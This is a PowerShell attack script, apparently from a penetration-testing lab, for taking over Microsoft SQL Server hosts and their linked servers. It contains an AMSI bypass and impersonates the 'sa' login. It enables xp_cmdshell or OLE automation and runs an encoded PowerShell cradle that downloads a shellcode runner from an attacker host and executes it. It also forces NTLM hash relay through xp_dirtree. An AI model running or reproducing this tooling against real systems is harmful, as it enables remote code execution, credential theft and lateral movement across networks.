function Invoke-MSSQLExploit{

    <#

    .SYNOPSIS

    #`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
    #`EXEC xp_cmdshell whoami";`

    # Payload PS shellcode runner: (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/expl-x64-ps_reflection.ps1) | IEX'
    # set str '(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/expl-x64-ps_reflection.ps1') | IEX'
    # echo -en $str | iconv -t UTF-16LE | base64 -w 0
    #'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMQA4AC4AOQA6ADgAMQAvAHIAdQBuAC4AcABzADEAJwApACAAfAAgAEkARQBYAA=='


    (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-MSSQLExploit.ps1) | IEX'

    Invoke-MSSQLExploit -lhost "192.168.45.213" -lport 443(default) -sqlServer "appsrv01" -linkedLevel 1 -linkedSqlServer "dc01" -linkedSqlServer2 "appsrv01"  -t "sp_oacreate" -test
    Invoke-MSSQLExploit -lhost "192.168.45.213" -lport 443(default) -sqlServer "appsrv01" -linkedLevel 2 -linkedSqlServer "dc01" -linkedSqlServer2 "appsrv01"  -t "xp_cmdshell" -test

    .DESCRIPTION

    To-Do

    .PARAMETER lhost

    To-Do

    .Example

    C:\PS> Invoke-MSSQLExploit -lhost "192.168.45.213" -sqlServer "appsrv01" -database "master" -t "sp_oacreate"
    Description
    -----------
    Execute cmd on server placed in sqlServer using sp_oacreate technique. If -t parameter is not present "xp_cmdshell" technique is used as default
    Implemented techniques: "xp_cmdshell", "sp_oacreate"
    Parameter (-database) is not mandatory, if not present "master" database is used as default.

    .Example
    C:\PS> Invoke-MSSQLExploit -lhost "192.168.45.213" -database "master" -t "sp_oacreate" -sqlServer "appsrv01" -linkLevel 1 -linkedSqlServer "dc01" 

    Description
    -----------
    Execute cmd on linked server (-linkedSqlServer). Parameter required if linkLevel is set to 1.

    .Example

    C:\PS> Invoke-MSSQLExploit -lhost "192.168.45.213" -database "master" -t "sp_oacreate" -sqlServer "appsrv01" -linkLevel 2 -linkedSqlServer "dc01" -linkedSqlServer2 "appsrv01" 

    Description
    -----------
    Execute cmd on linked server (-linkedSqlServer2). Parameters linkedSqlServer and linkesSqlServer2 are required if linkLevel is set to 2.
    #>

    Param(

        [Parameter(Mandatory=$true)]
        [string]$lhost = "192.168.45.212",
        
        [Parameter(Mandatory = $false)]
        [string]
        $lport = "443",

        [Parameter(Mandatory = $false)]
        [string]
        $database = "master",

        [Parameter(Mandatory=$true)]
        [string]$sqlServer,

        [Parameter(Mandatory=$false)]
        [string]$t = "xp_cmdshell",

        [Parameter(Mandatory=$false)]
        [Int]$linkLevel = 0,

        
        [Parameter(Mandatory=$false)]
        [string]
        $linkedSqlServer,

        [Parameter(Mandatory=$false)]
        [string]$linkedSqlServer2,

        [Parameter( Mandatory=$false)]
        [switch]$test
        
    )

    if ($PSBoundParameters.ContainsKey('test')) {
        $test = $True
    } else {
        $test = $False
    }

    if ($PSBoundParameters.ContainsKey('linkLevel')) {
        if ($linkLevel -eq 1) {
            if (!$PSBoundParameters.ContainsKey('linkedSqlServer')) {
                Get-Help Invoke-MSSQLExploit -Examples
                Write-Ouptut ""
                Write-Output "[!] -linkedSqlServer parameter is missing!"
                return
            }
        }
        if ($linkLevel -eq 2) {
            if (!$PSBoundParameters.ContainsKey('linkedSqlServer') -or !$PSBoundParameters.ContainsKey('linkedSqlServer2') ) {
                Get-Help Invoke-MSSQLExploit -Exmaples
                Write-Ouptut ""
                Write-Output "[!] -linkedSqlServer or -linkedSqlServer2 parameter is missing!"
                Get-Help Invoke-MSSQLExploit
                return
            }
        }
    }  



    try {   
        # AMSI bypass
        $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
    }
    catch {
        if ($test) { Write-Output "No ASMI" }
    }



    if ($test){
        $payload = 'hostname; whoami';
    }
    else {
        $payload = "(New-Object System.Net.WebClient).DownloadString('http://$lhost/expl-x64-ps_reflection.ps1') | IEX;"
    }
  

    $conString = "Server = " + $sqlServer + "; Database = " + $database + "; Integrated Security = True;"   

    $con = New-Object System.Data.SqlClient.sqlConnection
    $con.ConnectionString = $conString
    try {
        $con.Open();
        if ($test) {Write-Output "Auth success!"}
    }
    catch {
        if ($test) {Write-Output "Auth failed"}
        break
    }


    #encryption the payload
    #$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
    $EncodedPayload = [Convert]::ToBase64String($bytes)
    #$EncodedPayload



    if ($linkLevel -eq 1) {

        $CmdSrv = $linkedSqlServer

        if ($test) {
            Write-Output "****** 1"
            Write-Output "Connected to $sqlServer. Executing cmd on $CmdSrv"
        }

        $impesonateUser = "EXEC ('EXECUTE AS LOGIN = ''sa'';') AT [$linkedSqlServer]"
        $enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [$linkedSqlServer]"
        #$execCmd = "EXEC xp_cmdshell whoami";
        $execCmd = "EXEC ('EXEC xp_cmdshell ''powershell -enc $EncodedPayload'';') AT [$linkedSqlServer]";
        $revert = "EXEC ('REVERT') AT [$linkedSqlServer];"

        #login and user check
        $querylogin = "select login from openquery([$linkedSqlServer], 'select SYSTEM_USER as login')";
        $queryuser = "select usr from openquery([$linkedSqlServer], 'select USER_NAME() as usr')";
 

        #sp_oacreate
        $enable_ole = "EXEC ('EXEC sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT [$linkedSqlServer]";
        $execCmdOle = "EXEC ('DECLARE @myshell INT; EXEC sp_oacreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''run'', null, ''powershell -enc $EncodedPayload'';') AT [$linkedSqlServer]";


        $relay = "EXEC ('EXEC master..xp_dirtree ''\\$lhost\test'';') AT [$linkedSqlServer]";
        
        #"EXEC master..xp_dirtree '\\$lhost\test';"
        #$relay = "EXEC master.sys.xp_dirtree  `"\\\\$lhost\\\\test`", 1, 1 ;"
 
 
    }
    elseif ($linkLevel -eq 2) {

        $CmdSrv = $linkedSqlServer2

        if ($test) {
            Write-Output "****** 2"
            Write-Output "Connected to $sqlServer. Executing cmd on $CmdSrv"
        }

        # `EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01`
        $impesonateUser = "EXEC ('EXEC (''EXECUTE AS LOGIN = ''''sa'''';'') AT [$linkedSqlServer2]') AT [$linkedSqlServer]"
        $enable_xpcmd = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure; EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [$linkedSqlServer2]') AT [$linkedSqlServer]"
        #$execCmd = "EXEC xp_cmdshell whoami";
        $execCmd = "EXEC ('EXEC (''EXEC xp_cmdshell ''''powershell -enc $EncodedPayload'''';'') AT [$linkedSqlServer2]') AT [$linkedSQLServer]";
        $revert = "EXEC ('EXEC (''REVERT'') AT [$linkedSqlServe2];') AT [$linkedSQLServer]"

        

        #login and user check
        $querylogin = "select login from openquery([$linkedSqlServer], 'select login from openquery([$linkedSqlServer2], ''select SYSTEM_USER as login'')')";
        $queryuser = "select usr from openquery([$linkedSqlServer], 'select usr from openquery([$linkedSqlServer2], ''select USER_NAME() as usr'')')";
    }
    else {

        $CmdSrv = $sqlServer
        if ($test) {
            Write-Output "****** 0"
            Write-Output "Connected to $sqlServer. Executing cmd on $CmdSrv"
        }
        
        $impersonateUser = "EXECUTE AS LOGIN = 'sa';";
        $enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
        #$execCmd = "EXEC xp_cmdshell whoami";
        $execCmd = "EXEC xp_cmdshell 'powershell -enc $EncodedPayload'";
        $revert = "REVERT;"

        #login and user check
        $querylogin = "SELECT SYSTEM_USER;";
        $queryuser = "SELECT USER_NAME();";


        #sp_oacreate
        $enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
        $execCmdOle = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc $EncodedPayload';";
    
        #relay hash
        $relay = "EXEC master..xp_dirtree '\\$lhost\test';"
        #$relay = "EXEC master.sys.xp_dirtree  `"\\\\$lhost\\\\test`", 1, 1 ;"
        #$relay = "EXEC sp_helprotect 'xp_cmdshell';"
    }
    
    


    if ($test) {

        Write-Output "`n"

        ####### test
        # $executeasuser = "use msdb; EXECUTE AS USER = 'dbo'; SELECT USER_NAME(); REVERT;";
        
        # $command = New-Object System.Data.SqlClient.SqlCommand($executeasuser,$con)
        # $reader = $command.ExecuteReader()
        # while ($reader.Read()) {
        #     Write-Output "[+] After impersonation"
        #     Write-Output "[+] Executing in the context of user: $($reader[0])"
        # }
        # $reader.Close()


        $executeaslogin = "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; REVERT;"
                
        $command = New-Object System.Data.SqlClient.SqlCommand($executeaslogin,$con)
        $reader = $command.ExecuteReader()
        while ($reader.Read()) {
            Write-Output "[+] After impersonation"
            Write-Output "[+] Executing in the context of: $($reader[0])"
        }
        $reader.Close()
        ########

        
        $command = New-Object System.Data.SqlClient.SqlCommand($querylogin,$con)
        $reader = $command.ExecuteReader()
        $a = $reader.Read()
        Write-Output "Logged in as: $($reader[0]) on $CmdSrv"
        $reader.Close()

        
        
        $command = New-Object System.Data.SqlClient.SqlCommand($queryuser,$con)
        $reader = $command.ExecuteReader()
        $a = $reader.Read()
        Write-Output "Mapped to user: $($reader[0]) on $CmdSrv"
        $reader.Close()


        # $executeaslogin = "REVERT;"
                
        # $command = New-Object System.Data.SqlClient.SqlCommand($executeaslogin,$con)
        # $reader = $command.ExecuteReader()
        # while ($reader.Read()) {
        #     Write-Output "[+] REvert"
        #     Write-Output "[+] Executing in the context of: $($reader[0])"
        # }
        # $reader.Close()
        ########

        Write-Output "`n"
    }

    # hash relay
    if ($t -eq "relay") 
    {
        if ($test) {Write-Output "Relay attack!"; Write-Host "Query: $relay"}

        #  try{
        #     Write-Output "Relay  impersonation"
        #     $command = New-Object System.Data.SqlClient.SqlCommand($impersonateUser ,$con)
        #     $reader = $command.ExecuteReader()
        #     $reader.Close()

        #     $command = New-Object System.Data.SqlClient.SqlCommand($querylogin,$con)
        #     $reader = $command.ExecuteReader()
        #     $a = $reader.Read()
        #     Write-Output "Logged in as: $($reader[0]) on $CmdSrv"
        #     $reader.Close()
        #  }
        #  catch{
        #     if ($test){
        #         Write-Output "[-] Cannot impersonate sa on $CmdSrv"
        #     }
        
        # }

        # $executeaslogin = "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; REVERT;"
                
        # $command = New-Object System.Data.SqlClient.SqlCommand($executeaslogin,$con)
        # $reader = $command.ExecuteReader()
        # while ($reader.Read()) {
        #     Write-Output "[+] After impersonation"
        #     Write-Output "[+] Executing in the context of: $($reader[0])"
        # }
        # $reader.Close()

        # ########

        
        try {
            $command = New-Object System.Data.SqlClient.SqlCommand($relay,$con)
            $reader = $command.ExecuteReader()
            if ($reader.Read()) {
                Write-Output "Relay cmd output: $($reader[0]) on $CmdSrv"
            }
            $reader.Close()
        }
        catch {
            if ($test){
                Write-Output "[-] xp_dirtree didn't work on $CmdSrv"
            }
        }
        
        

        try {
            $command = New-Object System.Data.SqlClient.SqlCommand($revert,$con)
            $reader = $command.ExecuteReader()
            $reader.Close()
        }
        catch {}

        # $executeaslogin = "REVERT;"
                
        # $command = New-Object System.Data.SqlClient.SqlCommand($executeaslogin,$con)
        # $reader = $command.ExecuteReader()
        # while ($reader.Read()) {
        #     Write-Output "[+] REvert"
        #     Write-Output "[+] Executing in the context of: $($reader[0])"
        # }
        # $reader.Close()
        # ########


        $con.Close()
        break
    }


    ########
    $executeaslogin = "EXECUTE AS LOGIN = 'sa';"
                
    $command = New-Object System.Data.SqlClient.SqlCommand($executeaslogin,$con)
    $reader = $command.ExecuteReader()
    while ($reader.Read()) {
        Write-Output "[+] After impersonation"
        Write-Output "[+] Executing in the context of: $($reader[0])"
    }
    $reader.Close()
    #######



    try{
        $command = New-Object System.Data.SqlClient.SqlCommand($impersonateUser ,$con)
        $reader = $command.ExecuteReader()
        $reader.Close()
    }
    catch{
        if ($test){
            Write-Output "[-] Cannot imperasonate sa on $CmdSrv"
        }
        
    }
    
    try {
        if ($t -eq "xp_cmdshell"){
            $command = New-Object System.Data.SqlClient.SqlCommand($enable_xpcmd,$con)
        }
            
        elseif ($t -eq "sp_oacreate") {
            $command = New-Object System.Data.SqlClient.SqlCommand($enable_ole,$con)
        }
        
        else {
            Write-Output "No technique selected: -t 'xp_cmdshell' or -t 'sp_oacreate'"
        }
        $reader = $command.ExecuteReader()
        $reader.Close()
    }
    catch{
        if ($test) {
            Write-Output "[-] Cannot enable xp_cmdshell sa on $CmdSrv"
        }   
    }

    try {
        if ($t -eq "xp_cmdshell"){
            $command = New-Object System.Data.SqlClient.SqlCommand($execCmd ,$con)
        }
            
        elseif ($t -eq "sp_oacreate") {
            $command = New-Object System.Data.SqlClient.SqlCommand($execCmdOle ,$con)
        }
        else {
            Write-Output "No technique selected: -t 'xp_cmdshell' or -t 'sp_oacreate'"
        }
        
        $reader = $command.ExecuteReader()
        if ($test) {
            while ($reader.Read()) {
                Write-Output "Cmd on $CmdSrv payload $payload output: $($reader[0])"
            }
        }
        $reader.Close()
    }
    catch {
        if ($test) {
            Write-Output "[-] Cannot run xp_cmdshell sa on $CmdSrv"
        }
        
    }
    

    try {
        $command = New-Object System.Data.SqlClient.SqlCommand($revert,$con)
        $reader = $command.ExecuteReader()
        $reader.Close()
    }
    catch {}

    ########
    $rev = "REVERT;"
            
    $command = New-Object System.Data.SqlClient.SqlCommand($rev,$con)
    $reader = $command.ExecuteReader()
    while ($reader.Read()) {
        Write-Output "[+] revert"
        Write-Output "[+] Executing in the context of: $($reader[0])"
    }
    $reader.Close()
    #######


    $con.Close()

}

